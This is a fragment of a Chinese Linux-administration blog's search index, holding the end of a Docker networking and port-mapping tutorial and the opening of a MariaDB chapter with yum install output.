;&#x79BB;&#x3002; 4.4 &#x7B80;&#x5355;&#x6F14;&#x793A; 1for i in `docker ps | grep -v &quot;CONTAINER&quot; | awk &apos;{print $1}&apos;`; do docker inspect $i | grep &apos;IPAddress&apos;; done &#x67E5;&#x770B;&#x6865;&#x63A5;&#x6A21;&#x5F0F;&#x4E0B;&#x4E3B;&#x673A;&#x5185;&#x90E8;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x548C;&#x5BB9;&#x5668;&#x4E0E;&#x5BBF;&#x4E3B;&#x673A;&#x76F4;&#x63A5;&#x5747;&#x53EF;&#x6B63;&#x5E38;&#x901A;&#x4FE1; 1docker inspect &#x5BB9;&#x5668;ID &#x67E5;&#x770B;host&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x5185;&#x90E8;&#x6CA1;&#x6709;IP&#x5730;&#x5740;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x7684;&#x4E3A;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x5730;&#x5740; 1docker run -d --new host docker.io/sergeyzh/centos-nginx &#x67E5;&#x770B;host&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x5185;&#x90E8;&#x6CA1;&#x6709;IP&#x5730;&#x5740;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x7684;&#x4E3A;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x5730;&#x5740; 1docker run -d --new none docker.io/sergeyzh/centos-nginx 4.5 &#x5BB9;&#x5668;&#x7AEF;&#x53E3; &#x5982;&#x679C;&#x60F3;&#x8BA9;&#x5916;&#x754C;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x5230;&#xFF0C;&#x57FA;&#x4E8E;bridge&#x7F51;&#x7EDC;&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x63D0;&#x4F9B;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x90A3;&#x4F60;&#x53EF;&#x4EE5;&#x544A;&#x8BC9;Docker&#x4F60;&#x8981;&#x4F7F;&#x7528;&#x54EA;&#x4E9B;&#x63A5;&#x53E3;&#x3002;&#x5982;&#x679C;&#x60F3;&#x67E5;&#x770B;&#x955C;&#x50CF;&#x4F1A;&#x4F7F;&#x7528;&#x54EA;&#x4E9B;&#x7AEF;&#x53E3;&#xFF0C;ExposedPorts&#xFF0C;&#x53EF;&#x4EE5;&#x83B7;&#x6089;&#x955C;&#x50CF;&#x4F7F;&#x7528;&#x54EA;&#x4E9B;&#x7AEF;&#x53E3;&#x3002; 12docker run -d -p 80 docker.io/sergeyzh/centos-nginxdocker port 09648b2ff7f6 -p &#x53C2;&#x6570;&#x4F1A;&#x5728;&#x5BBF;&#x4E3B;&#x673A;&#x968F;&#x673A;&#x6620;&#x5C04;&#x4E00;&#x4E2A;&#x9AD8;&#x7AEF;&#x53E3;&#x5230;&#x5BB9;&#x5668;&#x5185;&#x7684;&#x6307;&#x5B9A;&#x7AEF;&#x53E3; 1docker run -d -p 80:80 docker.io/sergeyzh/centos6-nginx #&#x5C06;&#x5BBF;&#x4E3B;&#x673A;&#x7684;80&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x5BB9;&#x5668;&#x7684;80&#x7AEF;&#x53E3; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MariaDB","date":"2022-06-07T05:16:21.000Z","path":"/posts/fbf617b4/","text":"&#x7AE0;&#x8282;&#x7B80;&#x8FF0;MySQL&#x6570;&#x636E;&#x5E93;&#x9879;&#x76EE;&#x81EA;&#x4ECE;&#x88AB;Oracle&#x516C;&#x53F8;&#x6536;&#x8D2D;&#x4E4B;&#x540E;&#xFF0C;&#x4ECE;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x8F6C;&#x53D8;&#x6210;&#x4E3A;&#x4E86;&#x201C;&#x95ED;&#x6E90;&#x201D;&#x8F6F;&#x4EF6;&#xFF0C;&#x8FD9;&#x5BFC;&#x81F4;IT&#x884C;&#x4E1A;&#x4E2D;&#x7684;&#x5F88;&#x591A;&#x4F01;&#x4E1A;&#x4EE5;&#x53CA;&#x5382;&#x5546;&#x7EB7;&#x7EB7;&#x9009;&#x62E9;&#x4F7F;&#x7528;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x8F6F;&#x4EF6;&#x7684;&#x540E;&#x8D77;&#x4E4B;&#x79C0;&#x2014;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x3002;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E5F;&#x56E0;&#x6B64;&#x5FEB;&#x901F;&#x5360;&#x636E;&#x4E86;&#x5E02;&#x573A;&#x3002;&#x672C;&#x7AE0;&#x5C06;&#x4ECB;&#x7ECD;&#x6570;&#x636E;&#x5E93;&#x4EE5;&#x53CA;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x7406;&#x8BBA;&#x77E5;&#x8BC6;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x4ECB;&#x7ECD;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6700;&#x540E;&#x5C06;&#x901A;&#x8FC7;&#x52A8;&#x624B;&#x5B9E;&#x9A8C;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x5E2E;&#x52A9;&#x5404;&#x4F4D;&#x8BFB;&#x8005;&#x638C;&#x63E1;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x4E00;&#x4E9B;&#x5E38;&#x89C4;&#x64CD;&#x4F5C;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x8D26;&#x6237;&#x7684;&#x521B;&#x5EFA;&#x4E0E;&#x7BA1;&#x7406;&#x3001;&#x8D26;&#x6237;&#x6743;&#x9650;&#x7684;&#x6388;&#x6743;&#xFF1B;&#x65B0;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x3001;&#x65B0;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x8868;&#x5355;&#xFF1B;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x6267;&#x884C;&#x65B0;&#x5EFA;&#x3001;&#x5220;&#x9664;&#x3001;&#x4FEE;&#x6539;&#x548C;&#x67E5;&#x8BE2;&#x7B49;&#x64CD;&#x4F5C;&#x3002;&#x672C;&#x7AE0;&#x6700;&#x540E;&#x8FD8;&#x4ECB;&#x7ECD;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x65B9;&#x6CD5;&#x3002;&#x5728;&#x5B66;&#x5B8C;&#x672C;&#x7AE0;&#x5185;&#x5BB9;&#x4E4B;&#x540E;&#xFF0C;&#x4E0D;&#x4F46;&#x53EF;&#x4EE5;&#x80DC;&#x4EFB;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x5DE5;&#x4F5C;&#x3002; 1 &#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x662F;&#x6307;&#x6309;&#x7167;&#x67D0;&#x4E9B;&#x7279;&#x5B9A;&#x7ED3;&#x6784;&#x6765;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x8D44;&#x6599;&#x7684;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x3002;&#x5728;&#x5F53;&#x4ECA;&#x8FD9;&#x4E2A;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8FC5;&#x901F;&#x5D1B;&#x8D77;&#x7684;&#x5E74;&#x4EE3;&#xFF0C;&#x4E92;&#x8054;&#x7F51;&#x4E0A;&#x6BCF;&#x5929;&#x90FD;&#x4F1A;&#x751F;&#x6210;&#x6D77;&#x91CF;&#x7684;&#x6570;&#x636E;&#x4FE1;&#x606F;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x6280;&#x672F;&#x4E5F;&#x4ECE;&#x6700;&#x521D;&#x53EA;&#x80FD;&#x5B58;&#x50A8;&#x7B80;&#x5355;&#x7684;&#x8868;&#x683C;&#x6570;&#x636E;&#x7684;&#x5355;&#x4E00;&#x96C6;&#x4E2D;&#x5B58;&#x50A8;&#x6A21;&#x5F0F;&#xFF0C;&#x53D1;&#x5C55;&#x5230;&#x4E86;&#x73B0;&#x5982;&#x4ECA;&#x5B58;&#x50A8;&#x6D77;&#x91CF;&#x6570;&#x636E;&#x7684;&#x5927;&#x578B;&#x5206;&#x5E03;&#x5F0F;&#x6A21;&#x5F0F;&#x3002;&#x5728;&#x4FE1;&#x606F;&#x5316;&#x793E;&#x4F1A;&#x4E2D;&#xFF0C;&#x80FD;&#x591F;&#x5145;&#x5206;&#x6709;&#x6548;&#x5730;&#x7BA1;&#x7406;&#x548C;&#x5229;&#x7528;&#x5404;&#x79CD;&#x6570;&#x636E;&#xFF0C;&#x6316;&#x6398;&#x5176;&#x4E2D;&#x7684;&#x4EF7;&#x503C;&#xFF0C;&#x662F;&#x8FDB;&#x884C;&#x79D1;&#x5B66;&#x7814;&#x7A76;&#x4E0E;&#x51B3;&#x7B56;&#x7BA1;&#x7406;&#x7684;&#x91CD;&#x8981;&#x524D;&#x63D0;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x6280;&#x672F;&#x4E5F;&#x662F;&#x7BA1;&#x7406;&#x4FE1;&#x606F;&#x7CFB;&#x7EDF;&#x3001;&#x529E;&#x516C;&#x81EA;&#x52A8;&#x5316;&#x7CFB;&#x7EDF;&#x3001;&#x51B3;&#x7B56;&#x652F;&#x6301;&#x7CFB;&#x7EDF;&#x7B49;&#x5404;&#x7C7B;&#x4FE1;&#x606F;&#x7CFB;&#x7EDF;&#x7684;&#x6838;&#x5FC3;&#x7EC4;&#x6210;&#x90E8;&#x5206;&#xFF0C;&#x662F;&#x8FDB;&#x884C;&#x79D1;&#x5B66;&#x7814;&#x7A76;&#x548C;&#x51B3;&#x7B56;&#x7BA1;&#x7406;&#x7684;&#x91CD;&#x8981;&#x6280;&#x672F;&#x624B;&#x6BB5;&#x3002;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x662F;&#x4E00;&#x79CD;&#x80FD;&#x591F;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x5B58;&#x653E;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5EFA;&#x7ACB;&#x3001;&#x4FEE;&#x6539;&#x3001;&#x5220;&#x9664;&#x3001;&#x67E5;&#x627E;&#x3001;&#x7EF4;&#x62A4;&#x7B49;&#x64CD;&#x4F5C;&#x7684;&#x8F6F;&#x4EF6;&#x7A0B;&#x5E8F;&#x3002;&#x5B83;&#x901A;&#x8FC7;&#x628A;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#x5177;&#x4F53;&#x7684;&#x7269;&#x7406;&#x6570;&#x636E;&#x8F6C;&#x6362;&#x6210;&#x9002;&#x5408;&#x7528;&#x6237;&#x7406;&#x89E3;&#x7684;&#x62BD;&#x8C61;&#x903B;&#x8F91;&#x6570;&#x636E;&#xFF0C;&#x6709;&#x6548;&#x5730;&#x964D;&#x4F4E;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7684;&#x6280;&#x672F;&#x95E8;&#x69DB;&#xFF0C;&#x56E0;&#x6B64;&#x5373;&#x4FBF;&#x662F;&#x4ECE;&#x4E8B;Linux&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#x7684;&#x5DE5;&#x7A0B;&#x5E08;&#x4E5F;&#x53EF;&#x4EE5;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x57FA;&#x672C;&#x7684;&#x7BA1;&#x7406;&#x64CD;&#x4F5C;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x8001;&#x5E08;&#x6709;&#x5FC5;&#x8981;&#x63D0;&#x9192;&#x5404;&#x4F4D;&#x8BFB;&#x8005;&#xFF0C;&#x672C;&#x8BFE;&#x7A0B;&#x7684;&#x6280;&#x672F;&#x4E3B;&#x7EBF;&#x4F9D;&#x7136;&#x662F;Linux&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x7EF4;&#xFF0C;&#x800C;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x53EA;&#x4E0D;&#x8FC7;&#x662F;&#x5728;&#x6B64;&#x4E3B;&#x7EBF;&#x4E0A;&#x7684;&#x4E00;&#x4E2A;&#x5185;&#x5BB9;&#x4E0D;&#x65AD;&#x6A2A;&#x5411;&#x6269;&#x5C55;&#x3001;&#x7EB5;&#x5411;&#x52A0;&#x6DF1;&#x7684;&#x5206;&#x652F;&#xFF0C;&#x4E0D;&#x80FD;&#x6307;&#x671B;&#x5728;&#x4E00;&#x4E24;&#x5929;&#x4E4B;&#x5185;&#x5C31;&#x53EF;&#x4EE5;&#x7CBE;&#x901A;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x6280;&#x672F;&#x3002;&#x5982;&#x679C;&#x6709;&#x540C;&#x5B66;&#x5728;&#x5B66;&#x5B8C;&#x672C;&#x8BFE;&#x7A0B;&#x5185;&#x5BB9;&#x4E4B;&#x540E;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x6280;&#x672F;&#x4EA7;&#x751F;&#x4E86;&#x6D53;&#x539A;&#x5174;&#x8DA3;&#xFF0C;&#x5E76;&#x5E0C;&#x671B;&#x8C0B;&#x5F97;&#x4E00;&#x4EFD;&#x76F8;&#x5173;&#x7684;&#x5DE5;&#x4F5C;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981;&#x989D;&#x5916;&#x4E3A;&#x81EA;&#x5DF1;&#x5B9A;&#x5236;&#x4E00;&#x4E2A;&#x5B66;&#x4E60;&#x89C4;&#x5212;&#x4E86;&#x3002; mariadbmysql &#x56FE;1 MariaDB&#x4E0E;Mysql&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x8457;&#x540D;LOGO &#x65E2;&#x7136;&#x662F;&#x8BB2;&#x89E3;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x6280;&#x672F;&#xFF0C;&#x5C31;&#x80AF;&#x5B9A;&#x7ED5;&#x4E0D;&#x5F00;MySQL&#x3002;MySQL&#x662F;&#x4E00;&#x6B3E;&#x5E02;&#x573A;&#x5360;&#x6709;&#x7387;&#x975E;&#x5E38;&#x9AD8;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x6280;&#x672F;&#x6210;&#x719F;&#x3001;&#x914D;&#x7F6E;&#x6B65;&#x9AA4;&#x76F8;&#x5BF9;&#x7B80;&#x5355;&#xFF0C;&#x800C;&#x4E14;&#x5177;&#x6709;&#x826F;&#x597D;&#x7684;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x7531;&#x4E8E;Oracle&#x516C;&#x53F8;&#x5728;2009&#x5E74;&#x6536;&#x8D2D;&#x4E86;MySQL&#x7684;&#x6BCD;&#x516C;&#x53F8;Sun&#xFF0C;&#x56E0;&#x6B64;MySQL&#x6570;&#x636E;&#x5E93;&#x9879;&#x76EE;&#x4E5F;&#x968F;&#x4E4B;&#x7EB3;&#x5165;Oracle&#x9EBE;&#x4E0B;&#xFF0C;&#x9010;&#x6B65;&#x6F14;&#x53D8;&#x4E3A;&#x4FDD;&#x6301;&#x7740;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x7684;&#x8EAB;&#x4EFD;&#xFF0C;&#x4F46;&#x53C8;&#x7533;&#x8BF7;&#x4E86;&#x591A;&#x9879;&#x5546;&#x4E1A;&#x4E13;&#x5229;&#x7684;&#x8F6F;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x662F;&#x5168;&#x7403;&#x9ED1;&#x5BA2;&#x3001;&#x6781;&#x5BA2;&#x3001;&#x7A0B;&#x5E8F;&#x5458;&#x7B49;&#x6280;&#x672F;&#x9AD8;&#x624B;&#x5728;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x7684;&#x5927;&#x65D7;&#x4E0B;&#x7684;&#x516C;&#x5171;&#x667A;&#x6167;&#x7ED3;&#x6676;&#xFF0C;&#x81EA;&#x5DF1;&#x7684;&#x52B3;&#x52A8;&#x6210;&#x679C;&#x88AB;&#x5176;&#x4ED6;&#x516C;&#x53F8;&#x5546;&#x4E1A;&#x5316;&#x81EA;&#x7136;&#x4E5F;&#x4F24;&#x4E86;&#x4E00;&#x5927;&#x6279;&#x5F00;&#x6E90;&#x5DE5;&#x4F5C;&#x8005;&#x7684;&#x5FC3;&#xFF0C;&#x56E0;&#x6B64;&#x7531;MySQL&#x9879;&#x76EE;&#x521B;&#x59CB;&#x8005;&#x91CD;&#x65B0;&#x7814;&#x53D1;&#x4E86;&#x4E00;&#x6B3E;&#x540D;&#x4E3A;MariaDB&#x7684;&#x5168;&#x65B0;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x3002;&#x8BE5;&#x8F6F;&#x4EF6;&#x5F53;&#x524D;&#x7531;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x8FDB;&#x884C;&#x7EF4;&#x62A4;&#xFF0C;&#x662F;MySQL&#x7684;&#x5206;&#x652F;&#x4EA7;&#x54C1;&#xFF0C;&#x800C;&#x4E14;&#x51E0;&#x4E4E;&#x5B8C;&#x5168;&#x517C;&#x5BB9;MySQL&#x3002;&#x4E0E;&#x6B64;&#x540C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x5404;&#x5927;&#x516C;&#x53F8;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x7740;&#x7ADE;&#x4E89;&#x5173;&#x7CFB;&#x6216;&#x5229;&#x76CA;&#x5173;&#x7CFB;&#xFF0C;&#x5916;&#x52A0;MySQL&#x5728;&#x88AB;&#x6536;&#x8D2D;&#x4E4B;&#x540E;&#x9010;&#x6E10;&#x7531;&#x5F00;&#x6E90;&#x5411;&#x95ED;&#x6E90;&#x8F6F;&#x4EF6;&#x8F6C;&#x53D8;&#xFF0C;&#x5F88;&#x591A;&#x516C;&#x53F8;&#x629B;&#x5F03;&#x4E86;MySQL&#x3002;&#x5F53;&#x524D;&#xFF0C;&#x8C37;&#x6B4C;&#x3001;&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x7B49;&#x6280;&#x672F;&#x9886;&#x57DF;&#x51B3;&#x5B9A;&#x5C06;MySQL&#x6570;&#x636E;&#x5E93;&#x4E0A;&#x7684;&#x4E1A;&#x52A1;&#x8F6C;&#x79FB;&#x5230;MariaDB&#x6570;&#x636E;&#x5E93;&#xFF0C;Linux&#x5F00;&#x6E90;&#x7CFB;&#x7EDF;&#x7684;&#x9886;&#x8896;&#x7EA2;&#x5E3D;&#x516C;&#x53F8;&#x4E5F;&#x51B3;&#x5B9A;&#x5728;RHEL 7&#x3001;CentOS 7&#x4EE5;&#x53CA;&#x6700;&#x65B0;&#x7684;Fedora&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5C06;MariaDB&#x4F5C;&#x4E3A;&#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x800C;&#x4E14;&#x7EA2;&#x5E3D;&#x516C;&#x53F8;&#x66F4;&#x662F;&#x9996;&#x6B21;&#x5C06;&#x6570;&#x636E;&#x5E93;&#x77E5;&#x8BC6;&#x52A0;&#x5165;&#x5230;&#x4E86;RHCE&#x8BA4;&#x8BC1;&#x7684;&#x8003;&#x8BD5;&#x5185;&#x5BB9;&#x4E2D;&#x3002;&#x968F;&#x540E;&#xFF0C;&#x8FD8;&#x6709;&#x6570;&#x5341;&#x4E2A;&#x5E38;&#x89C1;&#x7684;Linux&#x7CFB;&#x7EDF;&#xFF08;&#x5982;openSUSE&#x3001;Slackware&#x7B49;&#xFF09;&#x4E5F;&#x4F5C;&#x51FA;&#x4E86;&#x540C;&#x6837;&#x7684;&#x8868;&#x6001;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5766;&#x767D;&#x6765;&#x8BB2;&#xFF0C;&#x867D;&#x7136;IT&#x884C;&#x4E1A;&#x5DE8;&#x5934;&#x90FD;&#x51B3;&#x5B9A;&#x91C7;&#x7528;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7CFB;&#x7EDF;&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x7740;MariaDB&#x8F83;&#x4E4B;&#x4E8E;MySQL&#x6709;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF;&#x3002;&#x8001;&#x5E08;&#x7528;&#x4E86;&#x8FD1;&#x4E24;&#x5468;&#x7684;&#x65F6;&#x95F4;&#x6D4B;&#x8BD5;&#x4E86;MariaDB&#x4E0E;MySQL&#x7684;&#x533A;&#x522B;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x4E86;&#x591A;&#x9879;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x73B0;&#x5A92;&#x4F53;&#x6240;&#x8BF4;&#x7684;&#x90A3;&#x79CD;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF;&#x3002;&#x53EF;&#x4EE5;&#x8BF4;&#xFF0C;MariaDB&#x548C;MySQL&#x5728;&#x6027;&#x80FD;&#x4E0A;&#x57FA;&#x672C;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#xFF0C;&#x4E24;&#x8005;&#x7684;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x4E5F;&#x5341;&#x5206;&#x76F8;&#x4F3C;&#x3002;&#x4ECE;&#x52A1;&#x5B9E;&#x7684;&#x89D2;&#x5EA6;&#x6765;&#x8BB2;&#xFF0C;&#x5728;&#x638C;&#x63E1;&#x4E86;MariaDB&#x6570;&#x636E;&#x5E93;&#x7684;&#x547D;&#x4EE4;&#x548C;&#x57FA;&#x672C;&#x64CD;&#x4F5C;&#x4E4B;&#x540E;&#xFF0C;&#x5728;&#x4ECA;&#x540E;&#x7684;&#x5DE5;&#x4F5C;&#x4E2D;&#x5373;&#x4F7F;&#x9047;&#x5230;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5FEB;&#x901F;&#x4E0A;&#x624B;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x65E0;&#x8BBA;&#x9009;&#x62E9;&#x54EA;&#x4E00;&#x4E2A;&#x6765;&#x5B66;&#x4E60;&#x90FD;&#x6089;&#x542C;&#x541B;&#x4FBF;&#xFF0C;&#x800C;&#x672C;&#x4E66;&#x4E4B;&#x6240;&#x4EE5;&#x9009;&#x62E9;&#x4EE5;MariaDB&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x8BB2;&#x89E3;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4ECE;RHCE&#x8BA4;&#x8BC1;&#x8003;&#x8BD5;&#x548C;&#x6280;&#x672F;&#x5784;&#x65AD;&#x7684;&#x89D2;&#x5EA6;&#x4F5C;&#x7684;&#x51B3;&#x5B9A;&#x3002; 2 &#x521D;&#x59CB;&#x5316;MariaDB&#x670D;&#x52A1;&#x76F8;&#x8F83;&#x4E8E;MySQL&#xFF0C;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x6709;&#x4E86;&#x5F88;&#x591A;&#x65B0;&#x9C9C;&#x7684;&#x6269;&#x5C55;&#x7279;&#x6027;&#xFF0C;&#x4F8B;&#x5982;&#x5BF9;&#x5FAE;&#x79D2;&#x7EA7;&#x522B;&#x7684;&#x652F;&#x6301;&#x3001;&#x7EBF;&#x7A0B;&#x6C60;&#x3001;&#x5B50;&#x67E5;&#x8BE2;&#x4F18;&#x5316;&#x3001;&#x8FDB;&#x7A0B;&#x62A5;&#x544A;&#x7B49;&#x3002;&#x5728;&#x914D;&#x7F6E;&#x59A5;&#x5F53;Yum&#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x540E;&#xFF0C;&#x5373;&#x53EF;&#x5B89;&#x88C5;&#x90E8;&#x7F72;MariaDB&#x6570;&#x636E;&#x5E93;&#x4E3B;&#x7A0B;&#x5E8F;&#x53CA;&#x670D;&#x52A1;&#x7AEF;&#x7A0B;&#x5E8F;&#x4E86;&#x3002;&#x5728;&#x5B89;&#x88C5;&#x5B8C;&#x6BD5;&#x540E;&#xFF0C;&#x8BB0;&#x5F97;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x52A0;&#x5165;&#x5230;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002; 1234567891011121314151617181920212223242526272829303132333435363738394041424344[root@jaking ~]# yum install mariadb mariadb-serverLoaded plugins: langpacks, product-id, subscription-manager&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x7701;&#x7565;&#x90E8;&#x5206;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;Installing:&#xA0;mariadb x86_64 1:5.5.35-3.el7 rhel 8.9 M&#xA0;mariadb-server x86_64 1:5.5.35-3.el7 rhel 11 MInstalling for dependencies:&#xA0;perl-Compress-Raw-Bzip2 x86_64 2.061-3.el7 rhel 32 k&#xA0;perl-Compress-Raw-Zlib x86_64 1:2.061-4.el7 rhel 57 k&#xA0;perl-DBD-MySQL x86_64 4.023-5.el7 rhel 140 k&#xA0;perl-DBI x86_64 1.627-4.el7 rhel 802 k&#xA0;perl-Data-Dumper x86_64 2.145-3.el7 rhel 47 k&#xA0;perl-IO-Compress noarch 2.061-2.el7 rhel 260 k&#xA0;perl-Net-Daemon noarch 0.48-5.el7 rhel 51 k&#xA0;perl-PlRPC noarch 0.2020-14.el7 rhel 36 kTransaction Summary================================================================================Install 2 Packages (+8 Dependent packages)Total download size: 21 MInstalled size: 107 MIs this ok [y/d/N]: y Downloading packages:--------------------------------------------------------------------------------Total 82 MB/s | 21 MB 00:00 Running transaction checkRunning transaction testTransaction test succeededRunning transaction&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x7701;&#x7565;&#x90E8;&#x5206;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;Installed:&#xA0;mariadb.x86_64 1:5.5.35-3.el7 mariadb-server.x86_64 1:5.5.35-3.el7 Dependency Installed:&#xA0;perl-Compress-Raw-Bzip2.x86_64 0:2.061-3.el7 &#xA0;perl-Compress-Raw-Zlib.x86_64 1:2.061-4.el7 &#xA0;perl-DBD-MySQL.x86_64 0:4.023-5.el7 &#xA0;perl-DBI.x86_64 0:1.627-4.el7 &#xA0;perl-Data-Dumper.x86_64 0:2.145-3.el7 &#xA0;perl-IO-Compress.noarch 0:2.061-2.el7 &#xA0;perl-Net-Daemon.noarch 0:0.48-5.el7 &#xA0;perl-PlRPC.noarch 0:0.2020-14.el7Complete![root@jaking ~]# systemctl start mariadb [root@jaking ~]# systemctl enable mariadb ln -s &apos;/usr/lib/systemd/system/mariadb.service&apos; &apos;/etc/systemd/system/multi-user.target.wants/mariadb.service&apos; &#x5728;&#x786E;&#x8BA4;MariaDB&#x6570;&#x636E;&#x5E93;&#x8F6F;&#x4EF6;&#x7A0B;&#x5E8F;&#x5B89;&#x88C5;&#x5B8C;&#x6BD5;&#x5E76;&#x6210;&#x529F;&#x542F;&#x52A8;&#x540E;&#x8BF7;&#x4E0D;&#x8981;&#x7ACB;&#x5373;&#x4F7F;&#x7528;&#x3002;&#x4E3A;&#x4E86;&#x786E;&#x4FDD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5B89;&#x5168;&#x6027;&#x548C;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;&#x3002;&#x8FD9;&#x4E2A;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;&#x6D89;&#x53CA;&#x4E0B;&#x9762;5&#x4E2A;&#x6B65;&#x9AA4;&#x3002; 